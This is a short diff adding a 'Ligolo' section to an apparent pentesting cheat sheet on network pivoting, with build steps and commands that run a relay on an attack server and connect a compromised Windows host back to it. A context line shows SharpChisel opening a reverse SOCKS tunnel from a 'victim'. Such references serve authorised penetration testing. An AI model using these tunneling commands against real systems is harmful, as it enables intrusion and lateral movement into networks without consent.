@@ -201,6 +201,33 @@ server : run the Server Component of chisel
 user@victim$ SharpChisel.exe client --auth user:pass https://redacted.cloudfront.net R:1080:socks
 ```
 
+## Ligolo
+
+Ligolo : Reverse Tunneling made easy for pentesters, by pentesters
+
+
+1. Build Ligolo
+  ```powershell
+  # Get Ligolo and dependencies
+  cd `go env GOPATH`/src
+  git clone https://github.com/sysdream/ligolo
+  cd ligolo
+  make dep
+
+  # Generate self-signed TLS certificates (will be placed in the certs folder)
+  make certs TLS_HOST=example.com
+
+  make build-all
+  ```
+2. Use Ligolo
+  ```powershell
+  # On your attack server.
+  ./bin/localrelay_linux_amd64
+
+  # On the compromise host.
+  ligolo_windows_amd64.exe -relayserver LOCALRELAYSERVER:5555
+  ```
+
 ## Gost
 
 > Wiki English : https://docs.ginuerzh.xyz/gost/en/
